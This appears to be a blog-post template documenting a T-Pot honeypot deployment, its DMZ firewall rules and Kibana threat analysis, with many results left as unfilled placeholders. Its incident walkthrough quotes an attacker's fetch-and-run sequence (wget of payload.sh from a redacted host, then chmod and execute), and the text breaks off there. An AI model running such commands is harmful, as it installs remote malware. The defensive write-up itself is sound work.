---
layout: post
title: "Project: T-Pot Honeypot Deployment & Threat Analysis"
date: 2026-03-14
description: "Architecting a secure DMZ honeypot to capture and analyze live internet threats."
tags: [Cybersecurity, Threat Intelligence, Network Security, Blue Team]
---

# T-Pot Honeypot Deployment & Threat Analysis

## Executive Summary
To better understand the current automated threat landscape and practice incident analysis, I deployed a T-Pot multi-honeypot platform exposed to the public internet. Over the course of **[Insert Timeframe, e.g., 48 hours]**, the system captured **[Insert Number]** of attacks. This project outlines the secure architecture used to isolate the honeypot, an analysis of the captured telemetry via the Elastic Stack (ELK), and defensive takeaways for enterprise environments.

---

## 1. Architecture & Network Isolation
Exposing a vulnerable machine to the internet requires strict compartmentalization to prevent lateral movement. The honeypot was isolated using a dedicated DMZ with aggressive Access Control Lists (ACLs).

* **Public Facing:** Assigned a dedicated static IP from a public block.
* **Internal Isolation:** Placed on an isolated VLAN with no routing permitted to the primary internal network.
* **Firewall Rules:**
  * `ALLOW` All inbound WAN traffic to the Honeypot IP (to capture all port scans/attacks).
  * `DENY` All traffic from the Honeypot VLAN to internal subnets.
  * `ALLOW` Outbound WAN traffic from the Honeypot (to allow payload downloads for analysis).
  * `ALLOW` Management traffic from a dedicated administrative IP strictly to port 64297 (T-Pot WebUI).

---

## 2. Deployment Details
* **Hypervisor / Hardware:** [e.g., Dedicated bare-metal / Proxmox VM]
* **Operating System:** Debian 12 (Bookworm)
* **Platform:** T-Pot (Community Edition)
* **Active Honeypots:** Cowrie (SSH/Telnet), Dionaea (Malware), Mailoney (SMTP), Suricata (IDS)

---

## 3. Threat Intelligence & Attack Analysis
Once the IP was exposed, automated scanning and brute-force attempts began within **[Insert Time, e.g., 15 minutes]**. Using the built-in Kibana dashboards, I analyzed the attack data to identify patterns.

### Top Targeted Ports & Services
1. **Port 22 (SSH):** Primarily targeted by credential stuffing attacks.
2. **Port 23 (Telnet):** IoT botnet sweeps (Mirai variants).
3. **Port [Insert Port]:** [Insert observation]

### Global Attack Origins
* *Provide a brief summary of the top countries or ASNs originating the attacks. You can include a screenshot of your Kibana map here.*
* `![Kibana Map](link-to-your-image.png)`

---

## 4. Specific Incident Walkthrough: [Name of Attack, e.g., SSH Brute Force & Payload Drop]
*This section highlights a specific attack chain captured by the honeypot.*

* **Initial Access:** Attacker IP `[REDACTED]` successfully authenticated to the Cowrie honeypot using the credentials `root : [Password]`.
* **Execution:** Upon logging in, the automated script immediately executed the following commands to profile the system and download a payload:
  ```bash
  uname -a
  cd /tmp
  wget http://[REDACTED_MALICIOUS_IP]/payload.sh
  chmod +x payload.sh
  ./payload.sh
